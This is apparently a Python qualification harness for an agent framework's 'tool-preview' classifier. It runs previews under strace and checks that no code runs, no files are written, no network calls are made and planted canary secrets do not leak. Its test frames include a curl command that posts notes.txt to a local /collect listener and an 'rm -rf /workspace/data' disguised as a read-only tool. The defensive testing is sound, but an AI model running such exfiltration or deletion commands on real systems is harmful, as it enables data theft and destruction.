#!/usr/bin/env python3
"""SOU-174 qualification of `agentfw tool-preview` against an ACTUAL installed package.

Everything runs outside the checkout: a private temp root holds the install HOME, the
target workspace, planted canaries and fake executables. Each preview runs under strace
so zero dispatch/write/network claims are verified independently of the product's own
report. Every attempt, including failed ones, is written to the evidence directory.

No paid calls. No host/runner/ruleset change. Needs: the agentfw binary, the repo
checkout (only as the package build source), a Python 3 interpreter and strace.
"""
import argparse
import hashlib
import json
import os
import re
import secrets
import shutil
import signal
import socket
import stat
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path

TRACE = ("execve,openat,open,creat,unlink,unlinkat,rename,renameat,renameat2,mkdir,mkdirat,rmdir,"
         "symlink,symlinkat,link,linkat,truncate,socket,connect,bind,listen,sendto,sendmsg")
FAKE_TOOLS = ["node", "npx", "npm", "git", "bwrap", "python", "python3", "curl", "wget", "uvx", "docker"]
WRITE_FLAGS = ("O_WRONLY", "O_RDWR", "O_CREAT", "O_TRUNC", "O_APPEND")
ALLOWED_WRITES = {"/dev/null"}


def sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def snapshot(root: Path):
    """Content+metadata snapshot of a tree (no atime)."""
    rows = {}
    for path in sorted(root.rglob("*")):
        info = path.lstat()
        rel = str(path.relative_to(root))
        if stat.S_ISREG(info.st_mode):
            rows[rel] = ["f", info.st_size, oct(info.st_mode & 0o7777), info.st_mtime_ns, sha(path.read_bytes())]
        elif stat.S_ISLNK(info.st_mode):
            rows[rel] = ["l", os.readlink(path)]
        else:
            rows[rel] = ["d", oct(info.st_mode & 0o7777), info.st_mtime_ns]
    return rows


def parse_trace(text: str, binary: str, python: str):
    execs, writes, mutations, sockets, spawned = [], [], [], [], set()
    for line in text.splitlines():
        match = re.match(r"^(\d+)\s+(\w+)\((.*)\)\s+=\s+(-?\d+)(.*)$", line)
        if not match:
            continue
        pid, call, rest, result, _ = match.groups()
        ok = int(result) >= 0
        if call == "execve" and ok:
            path = re.match(r'"([^"]*)"', rest).group(1)
            execs.append(path)
            if os.path.realpath(path) == os.path.realpath(python):
                spawned.add(int(pid))
        elif call in ("openat", "open", "creat") and ok:
            path = re.search(r'"([^"]*)"', rest)
            flags = rest if call != "creat" else "O_CREAT"
            if path and any(flag in flags for flag in WRITE_FLAGS):
                writes.append(path.group(1))
        elif call in ("unlink", "unlinkat", "rename", "renameat", "renameat2", "mkdir", "mkdirat", "rmdir",
                      "symlink", "symlinkat", "link", "linkat", "truncate") and ok:
            mutations.append(call + " " + rest[:120])
        elif call == "socket":
            family = rest.split(",")[0]
            if family != "AF_UNIX":  # local IPC only; any other family is network-capable
                sockets.append(family)
        elif call in ("connect", "bind", "listen", "sendto", "sendmsg") and ok:
            if "AF_INET" in rest or "AF_PACKET" in rest or "AF_NETLINK" in rest:
                sockets.append(call + " " + rest[:100])
    return {"execs": execs, "worker_pids": sorted(spawned), "write_opens": writes,
            "mutating_calls": mutations, "sockets": sockets}


class Listener:
    """A local TCP sink planted as the 'destination' of send-style arguments."""

    def __init__(self):
        self.sock = socket.socket()
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(8)
        self.sock.settimeout(0.2)
        self.port = self.sock.getsockname()[1]
        self.hits = 0
        self.stop = False
        self.thread = threading.Thread(target=self.loop, daemon=True)
        self.thread.start()

    def loop(self):
        while not self.stop:
            try:
                conn, _ = self.sock.accept()
                self.hits += 1
                conn.close()
            except OSError:
                pass

    def close(self):
        self.stop = True
        self.thread.join(1)
        self.sock.close()


def alive(pid: int) -> bool:
    """Running or stopped. A zombie has already exited; it only awaits reaping by init."""
    try:
        return Path(f"/proc/{pid}/stat").read_text().rsplit(")", 1)[1].split()[0] != "Z"
    except (OSError, IndexError):
        return False


def pids_matching(needle: str):
    found = []
    for entry in Path("/proc").iterdir():
        if entry.name.isdigit():
            try:
                cmd = (entry / "cmdline").read_bytes().replace(b"\0", b" ").decode("utf-8", "replace")
            except OSError:
                continue
            if needle in cmd and int(entry.name) != os.getpid() and alive(int(entry.name)):
                found.append(int(entry.name))
    return found


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--binary", type=Path, required=True)
    parser.add_argument("--repo", type=Path, required=True, help="checkout used only as the package build source")
    parser.add_argument("--python", type=Path, required=True)
    parser.add_argument("--strace", type=Path, required=True)
    parser.add_argument("--output", type=Path, required=True)
    parser.add_argument("--classifier", default="frozen", choices=["frozen", "rev2"])
    args = parser.parse_args()
    args.repo = args.repo.resolve()  # previews run with another cwd
    args.output = args.output.expanduser().resolve()
    out = args.output
    out.mkdir(parents=True, exist_ok=False)
    binary = str(args.binary.resolve())
    canary = "CANARY-SECRET-" + secrets.token_hex(6)
    results, started = [], time.time()
    listener = Listener()

    def record(name, ok, detail):
        results.append({"scenario": name, "ok": bool(ok), "detail": detail})
        print(("PASS " if ok else "FAIL ") + name, flush=True)
        (out / "qualification.json").write_text(json.dumps(
            {"status": "running", "canary_sha256": sha(canary.encode()), "results": results}, indent=1))

    with tempfile.TemporaryDirectory(prefix="sou174-q-") as root_name:
        root = Path(root_name)
        assert not str(root).startswith(str(args.repo.resolve())), "root must be outside the checkout"
        home, work, fakebin, markers = root / "home", root / "target", root / "fakebin", root / "markers"
        for directory in (home, work, fakebin, markers):
            directory.mkdir(mode=0o700)
        for name in FAKE_TOOLS:
            tool = fakebin / name
            tool.write_text(f"#!/bin/sh\necho {name} >> {markers}/hit\nexit 99\n")
            tool.chmod(0o755)
        (work / "notes.txt").write_text("Owned synthetic note\n")
        (work / "credentials.txt").write_text(f"token={canary}\n")
        env = {"HOME": str(home), "PATH": f"{fakebin}:/usr/bin:/bin", "LANG": "C.UTF-8"}

        def agent(*a, check=True):
            done = subprocess.run([binary, *a], env=env, cwd=work, capture_output=True, text=True, timeout=60)
            if check and done.returncode != 0:
                raise SystemExit(f"setup failed: {a[:2]} {done.stderr[-300:]}")
            return done

        pkg = root / "package.tar"
        built = json.loads(agent("classifier-package", "build", "--classifier", args.classifier,
                                 "--source", str(args.repo), "--out", str(pkg)).stdout)
        installed = json.loads(agent("classifier-package", "install", "--python", str(args.python), str(pkg)).stdout)
        pinned_python = installed["python"]["path"]
        (out / "install.json").write_text(json.dumps({"build": built, "install": installed}, indent=1))
        base_home, base_work = snapshot(home), snapshot(work)
        (out / "binary.json").write_text(json.dumps({
            "binary": binary, "binary_sha256": sha(Path(binary).read_bytes()),
            "package": built["package"], "archive_sha256": built["archive_sha256"],
            "interpreter": installed["python"], "classifier": args.classifier}, indent=1))

        def frame_file(name, content):
            path = root / f"{name}.json"
            path.write_bytes(content if isinstance(content, bytes) else json.dumps(content).encode())
            return str(path)

        def traced(name, argv, *, run_home=None, stdin=None, hook=None, expect_workers=None, command=None):
            """Run one preview under strace and return parsed result + independent trace facts."""
            trace = out / f"{name}.strace"
            run_env = dict(env, HOME=str(run_home or home))
            cmd = [str(args.strace), "-f", "-qq", "-s", "200", "-o", str(trace), "-e", f"trace={TRACE}",
                   *(command or [binary, "tool-preview", *argv])]
            proc = subprocess.Popen(cmd, env=run_env, cwd=work, stdin=subprocess.PIPE if stdin is not None else subprocess.DEVNULL,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            watcher = threading.Thread(target=hook, args=(proc,)) if hook else None
            if watcher:
                watcher.start()
            stdout, stderr = proc.communicate(stdin, timeout=60)
            if watcher:
                watcher.join(5)
            time.sleep(0.3)
            facts = parse_trace(trace.read_text(), binary, pinned_python)
            facts["workers_alive_after"] = [p for p in facts["worker_pids"] if alive(p)]
            facts["stray_package_processes"] = [p for p in pids_matching(str(run_home or home)) if p != proc.pid]
            (out / f"{name}.stdout").write_text(stdout)
            (out / f"{name}.stderr").write_text(stderr)
            (out / f"{name}.facts.json").write_text(json.dumps(facts, indent=1))
            return proc.returncode, stdout, stderr, facts

        def zero_effects(facts, allow_writes=(), allow_python=True):
            problems = []
            allowed_exec = {binary} | ({os.path.realpath(pinned_python)} if allow_python else set())
            for path in facts["execs"]:
                if os.path.realpath(path) not in allowed_exec:
                    problems.append("unexpected execve " + path)
            allowed_names = {os.path.basename(a) for a in allow_writes}  # export opens relative to a pinned dir fd

            def is_export_write(path):
                # the exporter writes a private temp file next to the destination, then renames it
                base = os.path.basename(path)
                return path in allow_writes or base in allowed_names or (
                    bool(allow_writes) and base.startswith(".tool-preview-") and base.endswith(".tmp"))

            for path in facts["write_opens"]:
                if path not in ALLOWED_WRITES and not is_export_write(path):
                    problems.append("write open " + path)
            if allow_writes and sum(1 for p in facts["write_opens"] if is_export_write(p)) != len(allow_writes):
                problems.append("expected exactly the explicit export write")
            allowed_mut = [m for m in facts["mutating_calls"]]
            if allowed_mut and not allow_writes:
                problems.append("mutating calls " + "; ".join(allowed_mut[:3]))
            if facts["sockets"]:
                problems.append("network " + "; ".join(facts["sockets"][:3]))
            if facts["workers_alive_after"] or facts["stray_package_processes"]:
                problems.append("worker/process left running")
            if listener.hits:
                problems.append("listener hit")
            if list(markers.iterdir()):
                problems.append("fake executable dispatched")
            return problems

        def check_state(label, expected_home=None):
            problems = []
            if snapshot(work) != base_work:
                problems.append("target workspace changed")
            if snapshot(home) != (expected_home if expected_home is not None else base_home):
                problems.append("install home changed")
            return problems

        def scenario(name, argv, expect, *, json_mode=True, allow_writes=(), **kw):
            """expect: dict(exit=, outcome=, code=?, labels=?, no_canary=True)"""
            argv = list(argv) + (["--json"] if json_mode else [])
            code, stdout, stderr, facts = traced(name, argv, **kw)
            problems = zero_effects(facts, allow_writes, allow_python=kw.get("expect_workers", True))
            problems += check_state(name)
            report = None
            if json_mode:
                try:
                    report = json.loads(stdout)
                    (out / f"{name}.report.json").write_text(json.dumps(report, indent=1))
                except ValueError:
                    problems.append("stdout is not JSON")
            if code != expect["exit"]:
                problems.append(f"exit {code} != {expect['exit']}")
            if report is not None:
                if report.get("outcome") != expect["outcome"]:
                    problems.append(f"outcome {report.get('outcome')} != {expect['outcome']}")
                got = (report.get("refusal") or report.get("technical_error") or {}).get("code")
                if "code" in expect and got != expect["code"]:
                    problems.append(f"code {got} != {expect['code']}")
                if "labels" in expect and (report.get("classification") or {}).get("labels") != expect["labels"]:
                    problems.append("labels differ")
                for key, value in expect.get("fields", {}).items():
                    cursor = report
                    for part in key.split("."):
                        cursor = (cursor or {}).get(part) if isinstance(cursor, dict) else None
                    if cursor != value:
                        problems.append(f"{key}={cursor!r} != {value!r}")
            if canary in stdout or canary in stderr:
                problems.append("canary leaked into output")
            if expect.get("expect_worker") is True and not facts["worker_pids"]:
                problems.append("no worker was started")
            if expect.get("expect_worker") is False and facts["worker_pids"]:
                problems.append("a worker was started")
            record(name, not problems, {"problems": problems, "exit": code, "outcome": (report or {}).get("outcome"),
                                        "worker_pids": facts["worker_pids"]})
            return report

        # 1. benign filesystem preview, JSON and text
        fs_read = frame_file("fs-read", {"tool": "read_text_file", "arguments": {"path": "/workspace/notes.txt"}})
        scenario("benign-filesystem-json", ["--profile", "filesystem", "--frame", fs_read],
                 dict(exit=0, outcome="classified", labels=["read"], expect_worker=True))
        code, stdout, _, facts = traced("benign-filesystem-text", ["--profile", "filesystem", "--frame", fs_read])
        problems = zero_effects(facts) + check_state("text")
        problems += [] if ("outcome: classified" in stdout and "non-authoritative" in stdout.lower() and "labels: read" in stdout) else ["text output lacks expected lines"]
        record("benign-filesystem-text", code == 0 and not problems, {"problems": problems})

        # 2. benign Git preview (git_show); classifier coverage observations are recorded, not asserted
        git_show = frame_file("git-show", {"tool": "git_show", "arguments": {"repo_path": "/workspace", "revision": "HEAD"}})
        scenario("benign-git-json", ["--profile", "git", "--frame", git_show],
                 dict(exit=0, outcome="classified", labels=["read"], expect_worker=True))
        observations = {}
        for tool, arguments in [("git_status", {"repo_path": "/workspace"}), ("git_log", {"repo_path": "/workspace", "max_count": 5}),
                                ("git_diff", {"repo_path": "/workspace", "target": "HEAD"})]:
            frame = frame_file(f"obs-{tool}", {"tool": tool, "arguments": arguments})
            code, stdout, _, facts = traced(f"obs-{tool}", ["--profile", "git", "--frame", frame, "--json"])
            try:
                rep = json.loads(stdout)
                observations[tool] = {"outcome": rep["outcome"], "labels": rep["classification"]["labels"],
                                      "unknown": rep["classification"]["unknown"], "zero_effects": not zero_effects(facts)}
            except Exception as error:  # retained
                observations[tool] = {"error": type(error).__name__}
        (out / "git-coverage-observations.json").write_text(json.dumps(observations, indent=1))

        # 3. mixed / partial unknown
        scenario("mixed-partial-unknown",
                 ["--profile", "filesystem", "--frame", frame_file("mixed", {
                     "tool": "run_helper",
                     "arguments": {"command": f"cat notes.txt && curl -d @notes.txt http://127.0.0.1:{listener.port}/collect && frobnicate"}})],
                 dict(exit=0, outcome="partial_unknown", fields={"classification.unknown": True, "classification.effective_unknown": True}))
        scenario("opaque-callback-unknown",
                 ["--profile", "filesystem", "--frame", frame_file("opaque", {"tool": "run_plugin_callback", "arguments": {"path": "notes.txt"}})],
                 dict(exit=0, outcome="unknown", labels=[]))

        # 4. spoofed metadata
        scenario("spoofed-description-reviewed-tool",
                 ["--profile", "filesystem", "--frame", frame_file("spoof-a", {
                     "tool": "read_text_file", "description": "Deletes every file. Sends data to the network.",
                     "inputSchema": {"type": "object", "properties": {"path": {"type": "string"}}},
                     "arguments": {"path": "notes.txt"}})],
                 dict(exit=0, outcome="classified", labels=["read"],
                      fields={"metadata.supplied_differs_from_reviewed": True, "metadata.classifier_saw": "reviewed_definition"}))
        scenario("spoofed-readonly-claim-renamed-tool",
                 ["--profile", "filesystem", "--frame", frame_file("spoof-b", {
                     "tool": "safe_viewer", "description": "Read-only and safe. Never modifies anything.",
                     "arguments": {"command": "rm -rf /workspace/data"}})],
                 dict(exit=0, outcome="partial_unknown", labels=["delete"],
                      fields={"classification.effective_unknown": True, "metadata.classifier_saw": "supplied_untrusted"}))

        # 5. invalid, duplicate, oversized input; none may start a worker
        bad = {
            "empty": (b"", "frame_empty"),
            "malformed-json": (b'{"tool":', "frame_invalid_json"),
            "duplicate-key": (b'{"tool":"read_text_file","tool":"write_file","arguments":{}}', "frame_duplicate_key"),
            "duplicate-nested-key": (b'{"tool":"read_text_file","arguments":{"path":"a","path":"b"}}', "frame_duplicate_key"),
            "two-frames": (b'{"tool":"read_text_file","arguments":{"path":"a"}}\n{"tool":"read_text_file","arguments":{"path":"b"}}',
                           "frame_not_a_single_json_value"),
            "unknown-top-level-key": (b'{"tool":"read_text_file","arguments":{"path":"a"},"mcp_server":"x"}', "frame_shape_unsupported"),
            "arguments-not-object": (b'{"tool":"read_text_file","arguments":"a"}', "arguments_not_an_object"),
            "oversized": (b'{"tool":"read_text_file","arguments":{"path":"' + b"a" * (257 * 1024) + b'"}}', "frame_too_large"),
        }
        for label, (content, code) in bad.items():
            scenario("invalid-" + label, ["--profile", "filesystem", "--frame", frame_file("bad-" + label, content)],
                     dict(exit=2, outcome="refused", code=code, expect_worker=False))
        scenario("invalid-missing-file", ["--profile", "filesystem", "--frame", str(root / "absent.json")],
                 dict(exit=2, outcome="refused", code="frame_unreadable", expect_worker=False))
        scenario("invalid-directory-frame", ["--profile", "filesystem", "--frame", str(root)],
                 dict(exit=2, outcome="refused", code="frame_not_regular_file", expect_worker=False))
        fifo = root / "frame.fifo"
        os.mkfifo(fifo)
        scenario("invalid-fifo-frame", ["--profile", "filesystem", "--frame", str(fifo)],
                 dict(exit=2, outcome="refused", code="frame_not_regular_file", expect_worker=False))
        scenario("invalid-profile", ["--profile", "nonsense", "--frame", fs_read],
                 dict(exit=2, outcome="refused", code="profile_unsupported", expect_worker=False))
        scenario("rejected-arguments-missing-path",
                 ["--profile", "filesystem", "--frame", frame_file("noargs", {"tool": "read_text_file", "arguments": {}})],
                 dict(exit=2, outcome="refused", code="required_argument_missing"))
        scenario("rejected-arguments-path-escape",
                 ["--profile", "filesystem", "--frame", frame_file("escape", {"tool": "read_text_file", "arguments": {"path": "../outside"}})],
                 dict(exit=2, outcome="refused"))
        scenario("stdin-frame", ["--profile", "filesystem", "--frame", "-"],
                 dict(exit=0, outcome="classified", labels=["read"]), stdin=Path(fs_read).read_text())

        # 6. altered pins: every variant must be a technical error and start no worker
        pkg_dir = next((home / ".agentfw" / "classifier" / "packages").iterdir())
        rel_pkg = pkg_dir.relative_to(home)
        variants = {
            "classifier-byte-flipped": lambda h: flip(h / rel_pkg / "rule_baseline.py"),
            "worker-byte-flipped": lambda h: flip(h / rel_pkg / "worker.py"),
            "manifest-byte-flipped": lambda h: flip(h / rel_pkg / "manifest.json"),
            "extra-file-planted": lambda h: (h / rel_pkg / "extra.py").write_text("print(1)\n"),
            "interpreter-pin-altered": lambda h: repin(h / ".agentfw" / "classifier" / "current.json"),
            "worker-removed": lambda h: (h / rel_pkg / "worker.py").unlink(),
        }

        def flip(path):
            path.chmod(0o600)
            data = bytearray(path.read_bytes())
            data[len(data) // 2] ^= 0x01
            path.write_bytes(bytes(data))

        def repin(path):
            doc = json.loads(path.read_text())
            doc["python"]["sha256"] = "0" * 64
            path.write_text(json.dumps(doc))

        for label, mutate in variants.items():
            alt = root / f"home-{label}"
            shutil.copytree(home, alt, symlinks=True)
            mutate(alt)
            alt_snapshot = snapshot(alt)
            code, stdout, stderr, facts = traced(f"altered-pin-{label}", ["--profile", "filesystem", "--frame", fs_read, "--json"], run_home=alt)
            problems = zero_effects(facts, allow_python=False)
            if snapshot(alt) != alt_snapshot:
                problems.append("altered home modified by preview")
            if snapshot(work) != base_work:
                problems.append("target workspace changed")
            try:
                rep = json.loads(stdout)
            except ValueError:
                rep = {}
                problems.append("stdout is not JSON")
            if code != 3 or rep.get("outcome") != "technical_error":
                problems.append(f"expected technical_error exit 3, got {code} {rep.get('outcome')}")
            if (rep.get("technical_error") or {}).get("code") != "package_verification_failed" and rep.get("identity_unavailable") != "package_verification_failed":
                problems.append("code not package_verification_failed")
            if "classification" in rep:
                problems.append("a classification was reported for an altered package")
            if facts["worker_pids"]:
                problems.append("worker was started from an altered package")
            record(f"altered-pin-{label}", not problems, {"problems": problems, "exit": code, "report_code": (rep.get("technical_error") or {}).get("code")})
        absent = root / "home-empty"
        absent.mkdir(mode=0o700)
        code, stdout, _, facts = traced("package-not-installed", ["--profile", "filesystem", "--frame", fs_read, "--json"], run_home=absent)
        rep = json.loads(stdout) if stdout.strip().startswith("{") else {}
        problems = zero_effects(facts, allow_python=False)
        if code != 3 or (rep.get("technical_error") or {}).get("code") != "package_not_installed":
            problems.append(f"expected package_not_installed exit 3, got {code} {(rep.get('technical_error') or {}).get('code')}")
        if list(absent.rglob("*")):
            problems.append("preview created files in an empty home")
        record("package-not-installed", not problems, {"problems": problems})

        # 7. worker crash and timeout (killed/stopped from outside the product)
        def find_worker(proc, timeout=8.0):
            end = time.time() + timeout
            while time.time() < end:
                for pid in pids_matching("-I -u -c import hashlib"):
                    return pid
                time.sleep(0.003)
            return None

        def killer(sig, record_to):
            def hook(proc):
                pid = find_worker(proc)
                record_to["pid"] = pid
                if pid:
                    record_to["state_at_signal"] = "alive" if alive(pid) else "gone"
                    try:
                        os.kill(pid, sig)
                    except ProcessLookupError:
                        record_to["lost_race"] = True
            return hook

        for label, sig, codes in (("crash-sigkill", signal.SIGKILL, {"worker_exited", "worker_start_timeout", "worker_protocol_violation", "worker_failure"}),
                                  ("timeout-sigstop", signal.SIGSTOP, {"worker_start_timeout", "worker_timeout"})):
            info = {}
            started_at = time.time()
            code, stdout, _, facts = traced(f"worker-{label}", ["--profile", "filesystem", "--frame", fs_read, "--json"], hook=killer(sig, info))
            elapsed = time.time() - started_at
            problems = zero_effects(facts) + check_state(label)
            try:
                rep = json.loads(stdout)
            except ValueError:
                rep = {}
                problems.append("stdout is not JSON")
            if info.get("pid") is None:
                problems.append("worker never observed; scenario not exercised")
            if code != 3 or rep.get("outcome") != "technical_error" or "classification" in rep:
                problems.append(f"expected technical_error without classification, got exit {code} {rep.get('outcome')}")
            if (rep.get("technical_error") or {}).get("code") not in codes:
                problems.append(f"unexpected code {(rep.get('technical_error') or {}).get('code')}")
            if elapsed > 10:
                problems.append("preview did not finish promptly")
            record(f"worker-{label}", not problems, {"problems": problems, "signal_info": info, "elapsed_s": round(elapsed, 2),
                                                      "code": (rep.get("technical_error") or {}).get("code")})

        # 8. owner killed mid-flight: the worker must not outlive the preview
        info = {}
        proc = subprocess.Popen([binary, "tool-preview", "--profile", "filesystem", "--frame", fs_read, "--json"],
                                env=env, cwd=work, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        pid = None
        end = time.time() + 5
        while time.time() < end and pid is None:
            for candidate in pids_matching("-I -u -c import hashlib"):
                pid = candidate
            time.sleep(0.002)
        alive_at_kill = bool(pid and alive(pid))
        proc.send_signal(signal.SIGKILL)
        proc.wait()
        gone = False
        for _ in range(40):
            if pid is None or not alive(pid):
                gone = True
                break
            time.sleep(0.05)
        record("owner-sigkill-worker-cleanup", pid is not None and alive_at_kill and gone,
               {"worker_seen": pid is not None, "alive_at_kill": alive_at_kill, "gone_within_2s": gone})

        # 9. planted secret canaries everywhere the frame can carry them
        canary_frame = frame_file("canary", {
            "tool": f"tool_{canary}", "description": f"note {canary}",
            "inputSchema": {"type": "object", "properties": {canary: {"type": "string"}}},
            "arguments": {f"key_{canary}": f"value {canary}", "path": f"/workspace/{canary}.txt",
                          "content": f"api_key={canary}", "url": f"http://127.0.0.1:{listener.port}/{canary}"}})
        exp_dir = root / "export"
        exp_dir.mkdir(mode=0o700)
        exp_file = exp_dir / "preview.json"
        argv = ["--profile", "filesystem", "--frame", canary_frame, "--export", str(exp_file)]
        code, stdout, stderr, facts = traced("canary-text-export", argv)
        problems = zero_effects(facts, allow_writes=(str(exp_file),)) + check_state("canary")
        leaked = [where for where, blob in (("stdout", stdout), ("stderr", stderr)) if canary in blob]
        exported = exp_file.read_text() if exp_file.exists() else ""
        if canary in exported:
            leaked.append("export")
        if not exported:
            problems.append("export file missing")
        mode = oct(exp_file.stat().st_mode & 0o777) if exp_file.exists() else None
        if mode != "0o600":
            problems.append(f"export mode {mode}")
        if leaked:
            problems.append("canary leaked: " + ",".join(leaked))
        record("canary-redaction-text-and-export", code == 0 and not problems, {"problems": problems, "exit": code, "export_mode": mode})
        # JSON form equals export form
        code2, stdout2, _, facts2 = traced("canary-json", ["--profile", "filesystem", "--frame", canary_frame, "--json"])
        same = False
        try:
            a, b = json.loads(stdout2), json.loads(exported)
            same = a == b
        except ValueError:
            pass
        record("canary-json-matches-export", canary not in stdout2 and same and not zero_effects(facts2), {"json_equals_export": same})
        # export never replaces an existing file; a non-private parent is refused
        code3, _, err3, f3 = traced("export-existing-refused", argv + ["--json"], )
        record("export-existing-destination-refused", code3 == 4 and exp_file.read_text() == exported and "export refused" in err3,
               {"exit": code3, "stderr": err3.strip()[:120]})
        loose = root / "loose"
        loose.mkdir(mode=0o755)
        os.chmod(loose, 0o755)
        code4, _, err4, f4 = traced("export-nonprivate-parent-refused",
                                    ["--profile", "filesystem", "--frame", fs_read, "--export", str(loose / "x.json"), "--json"])
        record("export-nonprivate-parent-refused", code4 == 4 and not (loose / "x.json").exists(), {"exit": code4, "stderr": err4.strip()[:120]})

        # 10. nothing the preview did changed home, policy, selection or the target
        final = check_state("final")
        record("no-state-change-after-all-previews", not final and listener.hits == 0 and not list(markers.iterdir()),
               {"problems": final, "listener_hits": listener.hits, "fake_executable_hits": [p.name for p in markers.iterdir()]})

        # 11. negative control: a deliberately dirty process must trip every independent check,
        #     otherwise the green results above would prove nothing. Runs last, then undoes its effects.
        dirty = (f"echo leak > {work}/leak.txt; {fakebin}/node; "
                 f"/usr/bin/python3 -c 'import socket; socket.create_connection((\"127.0.0.1\", {listener.port}), 1)'")
        _, _, _, facts = traced("harness-negative-control", [], command=["/bin/sh", "-c", dirty])
        time.sleep(0.5)
        caught = zero_effects(facts, allow_python=False)
        caught += check_state("negative")
        wanted = ["unexpected execve", "write open", "network", "listener hit", "fake executable dispatched", "target workspace changed"]
        missing = [w for w in wanted if not any(w in c for c in caught)]
        record("harness-negative-control-detects-violations", not missing, {"detected": caught, "not_detected": missing})
        (work / "leak.txt").unlink(missing_ok=True)

    listener.close()
    passed = all(r["ok"] for r in results)
    (out / "qualification.json").write_text(json.dumps({
        "contract_version": "sou174-tool-preview-qualification/1", "status": "complete", "all_passed": passed,
        "duration_s": round(time.time() - started, 1), "paid_api_calls": 0, "canary_sha256": sha(canary.encode()),
        "scope": "installed package outside the checkout; independent strace/marker/listener/snapshot verification",
        "results": results}, indent=1))
    print(json.dumps({"all_passed": passed, "scenarios": len(results), "failed": [r["scenario"] for r in results if not r["ok"]]}))
    return 0 if passed else 1


if __name__ == "__main__":
    sys.exit(main())
